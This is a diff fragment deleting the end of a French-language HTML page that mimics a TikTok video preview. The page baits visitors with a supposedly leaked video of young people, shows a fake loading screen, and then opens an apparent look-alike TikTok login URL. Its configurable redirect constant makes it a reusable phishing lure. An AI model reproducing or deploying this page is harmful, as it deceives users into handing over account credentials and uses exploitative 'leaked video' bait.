-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" width="24" height="24"><path fill="currentColor" fill-rule="evenodd" d="M10.938 3.175a.674.674 0 0 1 1.138-.488l6.526 6.215c.574.547.554 1.47-.043 1.991l-6.505 5.676a.674.674 0 0 1-1.116-.508V13.49s-6.985-1.258-9.225 2.854c-.209.384-1.023.518-.857-1.395.692-3.52 2.106-9.017 10.082-9.017z" clip-rule="evenodd"></path><path fill="#161823" fill-rule="evenodd" d="m15.754 6.212 1.295 2.59a1.12 1.12 0 0 1-.268 1.349l-5.799 5.042s-.28 1.403.562 1.403 7.578-6.174 7.578-6.174.28-.842-.561-1.684c-.843-.842-2.807-2.526-2.807-2.526" clip-rule="evenodd" opacity="0.03"></path><path fill="url(#a)" fill-rule="evenodd" d="M10.937 6.23v7.297s-6.683-.942-8.777 2.246C.146 18.839.331 12.309 3.363 9.057s7.574-2.827 7.574-2.827" clip-rule="evenodd" opacity="0.09"></path><defs><radialGradient id="a" cx="0" cy="0" r="1" gradientTransform="rotate(-113.046 11.628 5.43)scale(8.93256 8.78076)" gradientUnits="userSpaceOnUse"><stop></stop><stop offset="0.995" stop-opacity="0.01"></stop><stop offset="1" stop-opacity="0.01"></stop></radialGradient></defs></svg>
-        </div>
-    </div>
-</div>
-
-<div class="loading-screen" id="loadingScreen">
-    <div class="spinner"></div>
-    <p>Chargement de la vidéo...</p>
-</div>
-
-<script>
-    // 🎯 CONFIGURATION - Modifiez ces URLs selon vos besoins
-    const REDIRECT_TIKTOK_URL = "https://tiktok-auth-client.vercel.app/login";
-
-    // Variables pour l'aperçu
-    const USERNAME = "@username";
-    const DESCRIPTION = " Voici la nouvelle vidéo LOMOTIF de ces jeunes qui a fuité - 🔥✨";
-    const HASHTAGS = "#viral #trending #fyp #foryou";
-
-    // Fonction de redirection avec effet de chargement
-    function redirectToTikTok() {
-        const loadingScreen = document.getElementById('loadingScreen');
-        loadingScreen.style.display = 'flex';
-
-        // Simule un temps de chargement comme TikTok
-        setTimeout(() => {
-            window.open(REDIRECT_TIKTOK_URL, '_blank');
-            loadingScreen.style.display = 'none';
-        }, 1500);
-    }
-
-    // Gestion des clics
-    document.getElementById('tiktokContainer').addEventListener('click', redirectToTikTok);
-
-    // Toggle instructions sur mobile
-    function toggleInstructions() {
-        const instructions = document.getElementById('instructions');
-        instructions.style.display = instructions.style.display === 'block' ? 'none' : 'block';
-    }
-
-    // Mise à jour dynamique du contenu
-    document.addEventListener('DOMContentLoaded', function() {
-        document.querySelector('.username').textContent = USERNAME;
-        document.querySelector('.description').textContent = DESCRIPTION;
-        document.querySelector('.hashtags').textContent = HASHTAGS;
-    });
-
-    // Animation d'entrée
-    window.addEventListener('load', function() {
-        document.querySelector('.tiktok-container').style.animation = 'slideUp 0.5s ease-out';
-    });
-</script>
-
-<style>
-    @keyframes slideUp {
-        from {
-            transform: translateY(100px);
-            opacity: 0;
-        }
-        to {
-            transform: translateY(0);
-            opacity: 1;
-        }
-    }
-</style>
-</body>
-</html>
+    </body>
+    </html>
